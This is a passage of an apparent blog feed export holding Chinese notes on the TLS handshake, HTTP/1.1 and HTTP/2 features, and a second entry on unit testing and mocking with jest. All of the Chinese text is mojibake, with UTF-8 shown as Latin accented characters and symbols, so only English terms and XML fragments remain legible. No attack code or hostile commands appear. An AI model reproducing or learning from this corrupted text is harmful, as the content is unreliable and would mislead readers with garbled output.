2.æœåŠ¡å™¨å›žåº”ï¼ˆServerHelloï¼‰ï¼šéšæœºæ•°2ï¼Œç¡®è®¤åè®®å’ŒåŠ å¯†æ–¹æ³•ï¼Œè¯ä¹¦ ç¡®è®¤åŠ å¯†é€šä¿¡åè®®ç‰ˆæœ¬ã€‚å¦‚æžœæµè§ˆå™¨ä¸ŽæœåŠ¡å™¨æ”¯æŒçš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œåˆ™æœåŠ¡å™¨å…³é—­åŠ å¯†é€šä¿¡ ä¸€ä¸ªæœåŠ¡å™¨ç”Ÿæˆçš„éšæœºæ•°ï¼Œç¨åŽç”¨äºŽç”Ÿæˆå¯¹è¯å¯†é’¥ ç¡®è®¤åŠ å¯†æ–¹æ³• æœåŠ¡å™¨è¯ä¹¦ æ­¤å¤„ï¼Œå¦‚æžœæœåŠ¡å™¨éœ€è¦ç¡®è®¤å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œå¦‚é‡‘èžæœºæž„éœ€è¦å®¢æˆ·æä¾›USBå¯†é’¥ï¼ˆUç›¾ï¼‰ï¼Œå°±ä¼šå‘å®¢æˆ·ç«¯è¯·æ±‚è¯ä¹¦ã€‚ 3.å®¢æˆ·ç«¯å›žåº”ï¼šéšæœºæ•°3ï¼ˆåŠ å¯† session keyï¼Œæ ¹æ®å‰é¢éšæœºæ•°ç”Ÿæˆï¼Œè¯ä¹¦ä¸­å…¬é’¥åŠ å¯†ï¼‰ï¼Œç¼–ç é€šçŸ¥ ä¸€ä¸ªéšæœºæ•°ï¼Œç¨åŽç”¨äºŽç”Ÿæˆå¯¹è¯å¯†é’¥ï¼Œå¹¶ä¸”åªç”¨æœåŠ¡å™¨çš„å…¬é’¥åŠ å¯†ï¼Œé˜²æ­¢è¢«çªƒå¬ ç¼–ç æ”¹å˜é€šçŸ¥ï¼Œè¡¨ç¤ºéšåŽçš„ä¿¡æ¯éƒ½å°†ç”¨åŒæ–¹å•†å®šçš„åŠ å¯†æ–¹æ³•å’Œå¯†é’¥å‘é€ å®¢æˆ·ç«¯æ¡æ‰‹ç»“æŸé€šçŸ¥ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯çš„æ¡æ‰‹é˜¶æ®µå·²ç»ç»“æŸã€‚è¿™ä¸€é¡¹åŒæ—¶ä¹Ÿæ˜¯å‰é¢å‘é€çš„æ‰€æœ‰å†…å®¹çš„hashå€¼ï¼Œç”¨æ¥ä¾›æœåŠ¡å™¨æ ¡éªŒ å¦‚æžœå‰ä¸€æ­¥è¦æ±‚äº†å®¢æˆ·ç«¯è¯ä¹¦ï¼Œåˆ™ä¼šå‘é€è¯ä¹¦åŠç›¸å…³ä¿¡æ¯ã€‚ 4.æœåŠ¡å™¨å›žåº”ï¼šç¼–ç é€šçŸ¥ ç¼–ç æ”¹å˜é€šçŸ¥ï¼Œè¡¨ç¤ºéšåŽçš„ä¿¡æ¯éƒ½å°†ç”¨åŒæ–¹å•†å®šçš„åŠ å¯†æ–¹æ³•å’Œå¯†é’¥å‘é€ æœåŠ¡å™¨æ¡æ‰‹ç»“æŸé€šçŸ¥ï¼Œè¡¨ç¤ºæœåŠ¡å™¨çš„æ¡æ‰‹é˜¶æ®µå·²ç»ç»“æŸã€‚è¿™ä¸€é¡¹åŒæ—¶ä¹Ÿæ˜¯å‰é¢å‘é€çš„æ‰€æœ‰å†…å®¹çš„hashå€¼ï¼Œç”¨æ¥ä¾›å®¢æˆ·ç«¯æ ¡éªŒ è‡³æ­¤ï¼Œæ•´ä¸ªæ¡æ‰‹é˜¶æ®µå…¨éƒ¨ç»“æŸã€‚æŽ¥ä¸‹æ¥ï¼Œå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨è¿›å…¥HTTPSåŠ å¯†é€šä¿¡ï¼Œå°±å®Œå…¨æ˜¯ä½¿ç”¨æ™®é€šçš„HTTPåè®®ï¼Œåªä¸è¿‡ç”¨â€ä¼šè¯å¯†é’¥â€œåŠ å¯†å†…å®¹ã€‚ è®¤è¯ é€šè¿‡ä½¿ç”¨ è¯ä¹¦ æ¥å¯¹é€šä¿¡æ–¹è¿›è¡Œè®¤è¯ã€‚ æ•°å­—è¯ä¹¦è®¤è¯æœºæž„ï¼ˆCAï¼ŒCertificate Authorityï¼‰æ˜¯å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨åŒæ–¹éƒ½å¯ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæž„ã€‚ æœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘ CA æå‡ºå…¬å¼€å¯†é’¥çš„ç”³è¯·ï¼ŒCA åœ¨åˆ¤æ˜Žæå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åŽï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶åŽåˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬å¼€å¯†é’¥è¯ä¹¦åŽç»‘å®šåœ¨ä¸€èµ·ã€‚ å…­ã€HTTP/1.1æ–°ç‰¹æ€§ é»˜è®¤æ˜¯é•¿è¿žæŽ¥ æ”¯æŒæµæ°´çº¿ æ”¯æŒåŒæ—¶æ‰“å¼€å¤šä¸ª TCP è¿žæŽ¥ æ”¯æŒè™šæ‹Ÿä¸»æœº æ–°å¢žçŠ¶æ€ç  100 æ”¯æŒåˆ†å—ä¼ è¾“ç¼–ç  æ–°å¢žç¼“å­˜å¤„ç†æŒ‡ä»¤ max-age Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Match ç¼“å­˜å¤„ç†ï¼Œåœ¨HTTP1.0ä¸­ä¸»è¦ä½¿ç”¨headeré‡Œçš„If-Modified-Since,Expiresæ¥åšä¸ºç¼“å­˜åˆ¤æ–­çš„æ ‡å‡†ï¼ŒHTTP1.1åˆ™å¼•å…¥äº†æ›´å¤šçš„ç¼“å­˜æŽ§åˆ¶ç­–ç•¥ä¾‹å¦‚Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Matchç­‰æ›´å¤šå¯ä¾›é€‰æ‹©çš„ç¼“å­˜å¤´æ¥æŽ§åˆ¶ç¼“å­˜ç­–ç•¥ã€‚ å¸¦å®½ä¼˜åŒ–åŠç½‘ç»œè¿žæŽ¥çš„ä½¿ç”¨ï¼ŒHTTP1.0ä¸­ï¼Œå­˜åœ¨ä¸€äº›æµªè´¹å¸¦å®½çš„çŽ°è±¡ï¼Œä¾‹å¦‚å®¢æˆ·ç«¯åªæ˜¯éœ€è¦æŸä¸ªå¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒæœåŠ¡å™¨å´å°†æ•´ä¸ªå¯¹è±¡é€è¿‡æ¥äº†ï¼Œå¹¶ä¸”ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼ŒHTTP1.1åˆ™åœ¨è¯·æ±‚å¤´å¼•å…¥äº†rangeå¤´åŸŸï¼Œå®ƒå…è®¸åªè¯·æ±‚èµ„æºçš„æŸä¸ªéƒ¨åˆ†ï¼Œå³è¿”å›žç æ˜¯206ï¼ˆPartial Contentï¼‰ï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†å¼€å‘è€…è‡ªç”±çš„é€‰æ‹©ä»¥ä¾¿äºŽå……åˆ†åˆ©ç”¨å¸¦å®½å’Œè¿žæŽ¥ã€‚ é”™è¯¯é€šçŸ¥çš„ç®¡ç†ï¼Œåœ¨HTTP1.1ä¸­æ–°å¢žäº†24ä¸ªé”™è¯¯çŠ¶æ€å“åº”ç ï¼Œå¦‚409ï¼ˆConflictï¼‰è¡¨ç¤ºè¯·æ±‚çš„èµ„æºä¸Žèµ„æºçš„å½“å‰çŠ¶æ€å‘ç”Ÿå†²çªï¼›410ï¼ˆGoneï¼‰è¡¨ç¤ºæœåŠ¡å™¨ä¸Šçš„æŸä¸ªèµ„æºè¢«æ°¸ä¹…æ€§çš„åˆ é™¤ã€‚ Hostå¤´å¤„ç†ï¼Œåœ¨HTTP1.0ä¸­è®¤ä¸ºæ¯å°æœåŠ¡å™¨éƒ½ç»‘å®šä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ï¼Œå› æ­¤ï¼Œè¯·æ±‚æ¶ˆæ¯ä¸­çš„URLå¹¶æ²¡æœ‰ä¼ é€’ä¸»æœºåï¼ˆhostnameï¼‰ã€‚ä½†éšç€è™šæ‹Ÿä¸»æœºæŠ€æœ¯çš„å‘å±•ï¼Œåœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯ä»¥å­˜åœ¨å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼ˆMulti-homed Web Serversï¼‰ï¼Œå¹¶ä¸”å®ƒä»¬å…±äº«ä¸€ä¸ªIPåœ°å€ã€‚HTTP1.1çš„è¯·æ±‚æ¶ˆæ¯å’Œå“åº”æ¶ˆæ¯éƒ½åº”æ”¯æŒHostå¤´åŸŸï¼Œä¸”è¯·æ±‚æ¶ˆæ¯ä¸­å¦‚æžœæ²¡æœ‰Hostå¤´åŸŸä¼šæŠ¥å‘Šä¸€ä¸ªé”™è¯¯ï¼ˆ400 Bad Requestï¼‰ã€‚ é•¿è¿žæŽ¥ï¼ŒHTTP 1.1æ”¯æŒé•¿è¿žæŽ¥ï¼ˆPersistentConnectionï¼‰å’Œè¯·æ±‚çš„æµæ°´çº¿ï¼ˆPipeliningï¼‰å¤„ç†ï¼Œåœ¨ä¸€ä¸ªTCPè¿žæŽ¥ä¸Šå¯ä»¥ä¼ é€å¤šä¸ªHTTPè¯·æ±‚å’Œå“åº”ï¼Œå‡å°‘äº†å»ºç«‹å’Œå…³é—­è¿žæŽ¥çš„æ¶ˆè€—å’Œå»¶è¿Ÿï¼Œåœ¨HTTP1.1ä¸­é»˜è®¤å¼€å¯Connectionï¼š keep-aliveï¼Œä¸€å®šç¨‹åº¦ä¸Šå¼¥è¡¥äº†HTTP1.0æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ›å»ºè¿žæŽ¥çš„ç¼ºç‚¹ã€‚ ä¸ƒã€HTTP/2.0HTTP/1.x ç¼ºé™· HTTP/1.x å®žçŽ°ç®€å•æ˜¯ä»¥ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·çš„ï¼š å®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨å¤šä¸ªè¿žæŽ¥æ‰èƒ½å®žçŽ°å¹¶å‘å’Œç¼©çŸ­å»¶è¿Ÿï¼› ä¸ä¼šåŽ‹ç¼©è¯·æ±‚å’Œå“åº”é¦–éƒ¨ï¼Œä»Žè€Œå¯¼è‡´ä¸å¿…è¦çš„ç½‘ç»œæµé‡ï¼› ä¸æ”¯æŒæœ‰æ•ˆçš„èµ„æºä¼˜å…ˆçº§ï¼Œè‡´ä½¿åº•å±‚ TCP è¿žæŽ¥çš„åˆ©ç”¨çŽ‡ä½Žä¸‹ã€‚ äºŒè¿›åˆ¶åˆ†å¸§å±‚ HTTP/2.0 å°†æŠ¥æ–‡åˆ†æˆ HEADERS å¸§å’Œ DATA å¸§ï¼Œå®ƒä»¬éƒ½æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„ã€‚ åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œåªä¼šæœ‰ä¸€ä¸ª TCP è¿žæŽ¥å­˜åœ¨ï¼Œå®ƒæ‰¿è½½äº†ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµï¼ˆStreamï¼‰ã€‚ ä¸€ä¸ªæ•°æ®æµï¼ˆStreamï¼‰éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºŽæ‰¿è½½åŒå‘ä¿¡æ¯ã€‚ æ¶ˆæ¯ï¼ˆMessageï¼‰æ˜¯ä¸Žé€»è¾‘è¯·æ±‚æˆ–å“åº”å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—å¸§ã€‚ å¸§ï¼ˆFrameï¼‰æ˜¯æœ€å°çš„é€šä¿¡å•ä½ï¼Œæ¥è‡ªä¸åŒæ•°æ®æµçš„å¸§å¯ä»¥äº¤é”™å‘é€ï¼Œç„¶åŽå†æ ¹æ®æ¯ä¸ªå¸§å¤´çš„æ•°æ®æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£…ã€‚ åœ¨äºŒè¿›åˆ¶åˆ†å¸§å±‚ä¸Šï¼ŒHTTP 2.0 ä¼šå°†æ‰€æœ‰ä¼ è¾“çš„ä¿¡æ¯åˆ†å‰²ä¸ºæ›´å°çš„æ¶ˆæ¯å’Œå¸§,å¹¶å¯¹å®ƒä»¬é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼çš„ç¼–ç  ï¼Œå…¶ä¸­HTTP1.xçš„é¦–éƒ¨ä¿¡æ¯ä¼šè¢«å°è£…åˆ°Headerså¸§ï¼Œè€Œæˆ‘ä»¬çš„request bodyåˆ™å°è£…åˆ°Dataå¸§é‡Œé¢ã€‚ ç„¶åŽï¼ŒHTTP 2.0 é€šä¿¡éƒ½åœ¨ä¸€ä¸ªè¿žæŽ¥ä¸Šå®Œæˆï¼Œè¿™ä¸ªè¿žæŽ¥å¯ä»¥æ‰¿è½½ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµã€‚ç›¸åº”åœ°ï¼Œæ¯ä¸ªæ•°æ®æµä»¥æ¶ˆæ¯çš„å½¢å¼å‘é€ï¼Œè€Œæ¶ˆæ¯ç”±ä¸€æˆ–å¤šä¸ªå¸§ç»„æˆï¼Œè¿™äº›å¸§å¯ä»¥ä¹±åºå‘é€ï¼Œç„¶åŽå†æ ¹æ®æ¯ä¸ªå¸§é¦–éƒ¨çš„æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£…ã€‚ HTTP 2.0 çš„äºŒè¿›åˆ¶åˆ†å¸§æœºåˆ¶è§£å†³äº†HTTP1.xä¸­å­˜åœ¨çš„é˜Ÿé¦–é˜»å¡žé—®é¢˜ï¼Œä¹Ÿæ¶ˆé™¤äº†å¹¶è¡Œå¤„ç†å’Œå‘é€è¯·æ±‚åŠå“åº”æ—¶å¯¹å¤šä¸ªè¿žæŽ¥çš„ä¾èµ–ã€‚ æœ‰äº†æ–°çš„åˆ†å¸§æœºåˆ¶åŽï¼ŒHTTP 2.0ä¸å†ä¾èµ–å¤šä¸ªTCPè¿žæŽ¥åŽ»å®žçŽ°å¤šæµå¹¶è¡Œäº†ã€‚æ¯ä¸ªæ•°æ®æµéƒ½æ‹†åˆ†æˆå¾ˆå¤šå¸§,è€Œè¿™äº›å¸§å¯ä»¥äº¤é”™ï¼Œè¿˜å¯ä»¥åˆ†åˆ«ä¼˜å…ˆçº§ã€‚HTTP2.0è¿žæŽ¥éƒ½æ˜¯æŒä¹…åŒ–çš„ï¼Œè€Œä¸”å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´ä¹Ÿåªéœ€è¦ä¸€ä¸ªè¿žæŽ¥å³å¯ã€‚ å¤§å¤šæ•°HTTP è¿žæŽ¥çš„æ—¶é—´éƒ½å¾ˆçŸ­ï¼Œè€Œä¸”æ˜¯çªå‘æ€§çš„ï¼Œä½†TCP åªåœ¨é•¿æ—¶é—´è¿žæŽ¥ä¼ è¾“å¤§å—æ•°æ®æ—¶æ•ˆçŽ‡æ‰æœ€é«˜ã€‚HTTP 2.0 é€šè¿‡è®©æ‰€æœ‰æ•°æ®æµå…±ç”¨åŒä¸€ä¸ªè¿žæŽ¥ï¼Œå¯ä»¥æ›´æœ‰æ•ˆåœ°ä½¿ç”¨TCP è¿žæŽ¥ http1.0çš„é˜Ÿé¦–é˜»å¡ž å¯¹äºŽåŒä¸€ä¸ªtcpè¿žæŽ¥ï¼Œæ‰€æœ‰çš„http1.0è¯·æ±‚æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œåªæœ‰å‰ä¸€ä¸ªè¯·æ±‚çš„å“åº”æ”¶åˆ°äº†ï¼Œç„¶åŽæ‰èƒ½å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚ å¯è§ï¼Œhttp1.0çš„é˜Ÿé¦–ç»„å¡žå‘ç”Ÿåœ¨å®¢æˆ·ç«¯ã€‚ http1.1çš„é˜Ÿé¦–é˜»å¡ž å¯¹äºŽåŒä¸€ä¸ªtcpè¿žæŽ¥ï¼Œhttp1.1å…è®¸ä¸€æ¬¡å‘é€å¤šä¸ªhttp1.1è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¿…ç­‰å‰ä¸€ä¸ªå“åº”æ”¶åˆ°ï¼Œå°±å¯ä»¥å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±è§£å†³äº†http1.0çš„å®¢æˆ·ç«¯çš„é˜Ÿé¦–é˜»å¡žã€‚ä½†æ˜¯ï¼Œhttp1.1è§„å®šï¼ŒæœåŠ¡å™¨ç«¯çš„å“åº”çš„å‘é€è¦æ ¹æ®è¯·æ±‚è¢«æŽ¥æ”¶çš„é¡ºåºæŽ’é˜Ÿï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå…ˆæŽ¥æ”¶åˆ°çš„è¯·æ±‚çš„å“åº”ä¹Ÿè¦å…ˆå‘é€ã€‚è¿™æ ·é€ æˆçš„é—®é¢˜æ˜¯ï¼Œå¦‚æžœæœ€å…ˆæ”¶åˆ°çš„è¯·æ±‚çš„å¤„ç†æ—¶é—´é•¿çš„è¯ï¼Œå“åº”ç”Ÿæˆä¹Ÿæ…¢ï¼Œå°±ä¼šé˜»å¡žå·²ç»ç”Ÿæˆäº†çš„å“åº”çš„å‘é€ã€‚ä¹Ÿä¼šé€ æˆé˜Ÿé¦–é˜»å¡žã€‚ å¯è§ï¼Œhttp1.1çš„é˜Ÿé¦–é˜»å¡žå‘ç”Ÿåœ¨æœåŠ¡å™¨ç«¯ã€‚ æœåŠ¡ç«¯æŽ¨é€ HTTP/2.0 åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ page.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ script.js å’Œ style.css ç­‰ä¸Žä¹‹ç›¸å…³çš„èµ„æºä¸€èµ·å‘ç»™å®¢æˆ·ç«¯ã€‚ é¦–éƒ¨åŽ‹ç¼© HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚ HTTP/2.0 è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤å’Œæ›´æ–°ä¸€ä¸ªåŒ…å«ä¹‹å‰è§è¿‡çš„é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»Žè€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚ ä¸ä»…å¦‚æ­¤ï¼ŒHTTP/2.0 ä¹Ÿä½¿ç”¨ Huffman ç¼–ç å¯¹é¦–éƒ¨å­—æ®µè¿›è¡ŒåŽ‹ç¼©ã€‚ [](]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FUnitTesting%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å•å…ƒæµ‹è¯•å®šä¹‰å•å…ƒæµ‹è¯•ï¼ˆUnit Testingï¼‰ï¼Œæ˜¯æŒ‡å¯¹è½¯ä»¶ä¸­çš„æœ€å°å¯æµ‹è¯•å•å…ƒè¿›è¡Œæ£€æŸ¥å’ŒéªŒè¯ã€‚ ç‰¹ç‚¹1ã€å®ƒæ˜¯ä¸€ç§éªŒè¯è¡Œä¸º ç¨‹åºä¸­çš„æ¯ä¸€é¡¹åŠŸèƒ½éƒ½æ˜¯æµ‹è¯•æ¥éªŒè¯å®ƒçš„æ­£ç¡®æ€§ã€‚å®ƒä¸ºä»¥åŽçš„å¼€å‘æä¾›æ”¯æ´ã€‚å°±ç®—æ˜¯å¼€å‘åŽæœŸï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è½»æ¾çš„å¢žåŠ åŠŸèƒ½æˆ–æ›´æ”¹ç¨‹åºç»“æž„ï¼Œè€Œä¸ç”¨æ‹…å¿ƒè¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šç ´åé‡è¦çš„ä¸œè¥¿ã€‚è€Œä¸”å®ƒä¸ºä»£ç çš„é‡æž„æä¾›äº†ä¿éšœã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´è‡ªç”±çš„å¯¹ç¨‹åºè¿›è¡Œæ”¹è¿›ã€‚ 2ã€å®ƒæ˜¯ä¸€ç§è®¾è®¡è¡Œä¸º ç¼–å†™å•å…ƒæµ‹è¯•å°†ä½¿æˆ‘ä»¬ä»Žè°ƒç”¨è€…è§‚å¯Ÿã€æ€è€ƒã€‚ç‰¹åˆ«æ˜¯å…ˆå†™æµ‹è¯•ï¼ˆTest Firstï¼‰ï¼Œè¿«ä½¿æˆ‘ä»¬æŠŠç¨‹åºè®¾è®¡æˆæ˜“äºŽè°ƒç”¨å’Œå¯æµ‹è¯•çš„ï¼Œå³è¿«ä½¿æˆ‘ä»¬è§£é™¤è½¯ä»¶ä¸­çš„è€¦åˆã€‚ 3ã€å®ƒæ˜¯ä¸€ç§ç¼–å†™æ–‡æ¡£çš„è¡Œä¸º å•å…ƒæµ‹è¯•æ˜¯ä¸€ç§æ— ä»·çš„æ–‡æ¡£ï¼Œå®ƒæ˜¯å±•ç¤ºå‡½æ•°æˆ–ç±»å¦‚ä½•ä½¿ç”¨çš„æœ€ä½³æ–‡æ¡£ã€‚è¿™ä»½æ–‡æ¡£æ˜¯å¯ç¼–è¯‘ã€å¯è¿è¡Œçš„ï¼Œå¹¶ä¸”å®ƒä¿æŒæœ€æ–°ï¼Œæ°¸è¿œä¸Žä»£ç åŒæ­¥ã€‚ 4ã€å®ƒå…·æœ‰å›žå½’æ€§ è‡ªåŠ¨åŒ–çš„å•å…ƒæµ‹è¯•é¿å…äº†ä»£ç å‡ºçŽ°å›žå½’ï¼Œç¼–å†™å®Œæˆä¹‹åŽï¼Œå¯ä»¥éšæ—¶éšåœ°çš„å¿«é€Ÿè¿è¡Œæµ‹è¯•ã€‚ æ–­è¨€ï¼ˆassertï¼‰æ˜¯ç¼–ç¨‹æœ¯è¯­ï¼Œè¡¨ç¤ºä¸ºä¸€äº›å¸ƒå°”è¡¨è¾¾å¼ï¼Œç¨‹åºå‘˜ç›¸ä¿¡åœ¨ç¨‹åºä¸­çš„æŸä¸ªç‰¹å®šç‚¹è¯¥è¡¨è¾¾å¼å€¼ä¸ºçœŸï¼Œå¯ä»¥åœ¨ä»»ä½•æ—¶å€™å¯ç”¨å’Œç¦ç”¨æ–­è¨€éªŒè¯ï¼Œå› æ­¤å¯ä»¥åœ¨æµ‹è¯•æ—¶å¯ç”¨æ–­è¨€è€Œåœ¨éƒ¨ç½²æ—¶ç¦ç”¨æ–­è¨€ã€‚ BDD: Behavior-Driven Development (è¡Œä¸ºé©±åŠ¨å¼€å‘)TDD: Test-Driven Development (æµ‹è¯•é©±åŠ¨å¼€å‘)ATDD: Acceptance Test Driven Development(éªŒæ”¶æµ‹è¯•é©±åŠ¨å¼€å‘) ç”¨ä¾‹è®¾è®¡ä»»ä½•ä¸€ä¸ªå•å…ƒæµ‹è¯•éƒ½åº”è¯¥åŒ…å«ï¼š æ­£å¸¸è¾“å…¥ ç¦»æ•£è¦†ç›–å‚æ•°å€¼åŸŸ è¾¹ç•Œè¾“å…¥ ç©ºå€¼éªŒè¯ é›¶å€¼éªŒè¯ æœ€å¤§å€¼éªŒè¯ éžæ³•è¾“å…¥ å…¥å‚æ•°æ®ç±»åž‹éžæ³• å†…å­˜æº¢å‡ºéªŒè¯ å¹‚ç­‰ å¯¹äºŽå•å…ƒæµ‹è¯•æ¥è¯´ï¼Œä¿è¯å…¶å¹‚ç­‰æ€§éžå¸¸é‡è¦ï¼Œå¹‚ç­‰å°±æ˜¯åœ¨ç›¸åŒè¾“å…¥çš„å‰æä¸‹ï¼Œå…¶è¾“å‡ºç»“æžœä¸éšæ—¶é—´è€Œæ”¹å˜ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºŽå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€æ¥è¯´ï¼Œå†™å•å…ƒæµ‹è¯•åˆ™æ˜¯éžå¸¸å®¹æ˜“çš„äº‹æƒ…ï¼Œå› ä¸ºåœ¨å‡½æ•°å¼èŒƒå¼ä¸­ï¼Œæˆ‘ä»¬çš„å‡½æ•°éƒ½æ˜¯çº¯å‡½æ•°ï¼Œåœ¨èŒƒå¼å±‚é¢ä¸Šå°±å·²ç»çº¦æŸäº†å¼€å‘è€…å†™å‡ºå¹‚ç­‰çš„ç¨‹åºï¼Œé‚£ä¹ˆï¼Œåœ¨javascripté¢†åŸŸï¼Œæˆ‘ä»¬æƒ³è¦å†™å‡ºè´¨é‡æ›´é«˜ï¼Œå¯¹æµ‹è¯•å‹å¥½çš„ä»£ç çš„è¯ï¼Œåˆ™éœ€è¦å°½å¯èƒ½çš„å†™å‡ºå„ç§çº¯å‡½æ•°ï¼Œä»Žè€Œä¿è¯å¹‚ç­‰æ€§ã€‚ å¯¹äºŽå‰ç«¯è€Œè¨€ï¼Œå…¶å®žè¿˜åŒ…å«UIç•Œé¢çš„å¹‚ç­‰ï¼Œå¦‚ä½•æ›´åŠ é«˜æ•ˆçš„ä¿è¯ç•Œé¢å¹‚ç­‰ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å€ŸåŠ©jestçš„å¿«ç…§èƒ½åŠ›å®žçŽ°htmlç»“æž„çº§åˆ«çš„å¹‚ç­‰éªŒè¯æˆ–è€…é€šè¿‡geminiçš„ç¦»çº¿æˆªå›¾èƒ½åŠ›æ¥å®žçŽ°åƒç´ çº§çš„å¹‚ç­‰éªŒè¯ã€‚ Mock Mockæ•°æ®ï¼Œåœ¨ç¼–å†™å•å…ƒæµ‹è¯•ç”¨ä¾‹çš„è¿‡ç¨‹ä¸­ï¼Œæž„é€ Mockæ•°æ®æ˜¯éžå¸¸é‡è¦çš„å®žçŽ°æ‰‹æ®µï¼Œå› ä¸ºæž„é€ æ•°æ®å°±æ˜¯æˆ‘ä»¬åœ¨æž„é€ è¾“å…¥çš„è¿‡ç¨‹ï¼Œæ¯”å¦‚æ­£å¸¸è¾“å…¥/è¾¹ç•Œè¾“å…¥/éžæ³•è¾“å…¥ MockçŽ¯å¢ƒï¼Œå¯¹äºŽå‰ç«¯è‡ªåŠ¨åŒ–æµ‹è¯•è€Œè¨€ï¼Œæˆ‘ä»¬çš„çŽ¯å¢ƒMockï¼Œå¾€å¾€æ˜¯é€šè¿‡jsdomä¹‹ç±»çš„åº“å®žçŽ°çŽ¯å¢ƒmockï¼Œä¿è¯ç¦»çº¿åœºæ™¯ä¸‹å¯ä»¥éªŒè¯ä¾èµ–æµè§ˆå™¨APIçš„ç¨‹åºé€»è¾‘ Mockäº‹ä»¶ï¼Œå¯¹äºŽç¦»çº¿åœºæ™¯æ¥è¯´äººæœºäº¤äº’äº‹ä»¶æ˜¯ä¸ä¼šæœ‰çœŸå®žäººç±»å‚ä¸Žçš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦Mockäººæœºäº¤äº’äº‹ä»¶ï¼Œå¸®åŠ©ç¨‹åºé€»è¾‘å®žçŽ°UIç•Œé¢çš„äº¤äº’åŠŸèƒ½æ€§æµ‹è¯•ï¼Œåœ¨Reactä¸­ï¼Œæ˜¯å¯ä»¥é€šè¿‡enzymeæ¥å®žçŽ°Mockäº‹ä»¶ Mockæ¨¡å—/ç¬¬ä¸‰æ–¹åŒ…ï¼Œæœ‰äº›åœºæ™¯æˆ‘ä»¬çš„ç¨‹åºä¾èµ–äº†æŸäº›ç¬¬ä¸‰æ–¹åŒ…ï¼Œä½†æ˜¯ç¬¬ä¸‰æ–¹åŒ…ä¼šå¼•å…¥å‰¯ä½œç”¨ï¼Œæ¯”å¦‚axiosï¼Œå¦‚æžœè¢«æµ‹è¯•çš„ç¨‹åºä½¿ç”¨äº†è¯¥æ¨¡å—ï¼Œå®ƒä¼šèµ°çœŸå®žçš„å‘è¯·æ±‚é€»è¾‘ï¼Œè¿™æ ·è¿˜éœ€è¦å¼€ä¸€ä¸ªmockè¯·æ±‚æœåŠ¡ï¼Œå¦‚æžœæœ‰ä¸€ä¸ªæ¨¡å—æ‹¦æˆªMockèƒ½åŠ›ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦å†å¼€ä¸€ä¸ªmockè¯·æ±‚æœåŠ¡äº†ï¼Œæ°å¥½jestæä¾›äº†æ¨¡å—mockçš„èƒ½åŠ›ï¼Œå¯¹äºŽè¿™ç±»é—®é¢˜ä¾¿å¯ä»¥è½»æ¾è§£å†³ã€‚ 